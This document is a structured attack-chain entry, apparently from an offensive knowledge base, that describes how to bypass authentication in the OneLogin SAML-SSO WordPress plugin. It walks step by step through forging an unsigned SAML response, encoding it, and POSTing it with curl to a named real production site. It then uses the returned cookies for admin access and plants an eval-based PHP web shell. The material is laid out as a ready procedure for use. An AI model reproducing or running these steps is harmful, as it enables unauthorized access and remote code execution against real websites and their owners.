---
tags:
  - authentication-bypass
  - saml
  - wordpress
  - rce
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Privilege Escalation]]'
commands: []
platforms:
  - Web
  - WordPress
complexity: medium
procedures:
  - '[[procedures/Craft-Forged-SAML-Response-XML]]'
  - '[[procedures/Base64-Encode-SAML-Response-XML]]'
  - '[[procedures/Send-Forged-SAML-Response-via-HTTP-POST]]'
  - '[[procedures/Access-Site-with-Received-Authentication-Cookies]]'
  - '[[procedures/Demonstrate-RCE-via-PHP-Script-Creation]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
description: >-
  Exploits an authentication bypass vulnerability in the OneLogin SAML-SSO
  plugin to forge SAML responses and gain unauthorized access to WordPress admin
  dashboards, potentially leading to remote code execution.
skill_level: intermediate
impact_level: high
id: 4461d4f3-811f-418f-9d6f-a19c3176b3e0
created_at: '2025-12-11T03:47:39.241Z'
updated_at: '2025-12-11T03:47:39.241Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0004]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1078]]'
---
# Authentication Bypass in OneLogin SAML-SSO WordPress Plugin for Unauthorized Admin Access

Multi-stage attack chain demonstrating how to exploit an authentication bypass in the OneLogin SAML-SSO WordPress plugin by forging SAML responses, gaining admin access, and potentially achieving remote code execution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Forge SAML Response] --> B[Encode Response]
    B --> C[Send HTTP Request]
    C --> D[Access with Cookies]
    D --> E[Demonstrate RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
    style E fill:#8e44ad
```

## Prerequisites & Requirements

### Required Tools

- #curl
- #base64

### Target Environment

- WordPress site with OneLogin SAML-SSO plugin
- Web platform running PHP and nginx
- Services: OneLogin SAML-SSO, WPEngine

### Initial Access Requirements

- Access to the public-facing plugin endpoint
- No prior credentials needed
- Network access to the target URL

## Detailed Attack Procedures

## Step 1: Forge SAML Response - [[procedures/Craft-Forged-SAML-Response-XML]]

**Procedure**: [[procedures/Craft-Forged-SAML-Response-XML]]

**Objective**: Create a modified SAML response XML without the signature tag to bypass validation.

**Expected Output**: A response.xml file with adjusted attributes like username, email, name, and role (e.g., 'admin' username, 'Administrator' role).

**Success Indicators**:
- XML file is created without <ds:Signature /> tag
- Attributes are set for desired user role

First, modify a valid SAML response by removing the <ds:Signature /> tag and adjusting attributes.

## Step 2: Encode Response - [[procedures/Base64-Encode-SAML-Response-XML]]

**Procedure**: [[procedures/Base64-Encode-SAML-Response-XML]]

**Objective**: Prepare the forged XML for inclusion in the HTTP request by base64 encoding it.

**Expected Output**: Base64-encoded string stored in a variable.

**Success Indicators**:
- Successful encoding without errors
- Variable contains valid base64 data

Use [[commands/base64-encode-xml]] to encode the XML:

```bash
xml=`base64 response.xml`
```

## Step 3: Send Request - [[procedures/Send-Forged-SAML-Response-via-HTTP-POST]]

**Procedure**: [[procedures/Send-Forged-SAML-Response-via-HTTP-POST]]

**Objective**: Submit the forged SAML response to the plugin's endpoint to receive authentication cookies.

**Expected Output**: HTTP response with Set-Cookie headers and redirect.

**Success Indicators**:
- 302 Found response
- Authentication cookies received

Execute [[commands/curl-send-forged-saml]] to send the request:

```bash
curl -v 'https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs' --data "RelayState=/wp-login.php" --data-urlencode "SAMLResponse=$xml"
```

## Step 4: Access Site - [[procedures/Access-Site-with-Received-Authentication-Cookies]]

**Procedure**: [[procedures/Access-Site-with-Received-Authentication-Cookies]]

**Objective**: Use the cookies to log in as the impersonated user, potentially with admin privileges.

**Expected Output**: Access to the WordPress admin dashboard.

**Success Indicators**:
- Successful login with admin role
- Ability to interact with site features

Copy the received cookies to a browser or tool to access the site.

## Step 5: Demonstrate RCE - [[procedures/Demonstrate-RCE-via-PHP-Script-Creation]]

**Procedure**: [[procedures/Demonstrate-RCE-via-PHP-Script-Creation]]

**Objective**: As an admin, create a PHP script to prove remote code execution when chained with other vulnerabilities.

**Expected Output**: A PHP file under the webroot that allows code execution.

**Success Indicators**:
- File creation successful
- Execution of arbitrary code via the script

Create a file like bugb.php with content <?php eval($_POST["php"]); ?>.

## Attack Chain Summary

### Key Achievements

1. Forged SAML response to bypass authentication
2. Gained admin access to WordPress site
3. Potential for RCE through chained vulnerabilities

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Valid Accounts]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Privilege Escalation]]

*Last updated: [TIMESTAMP]*
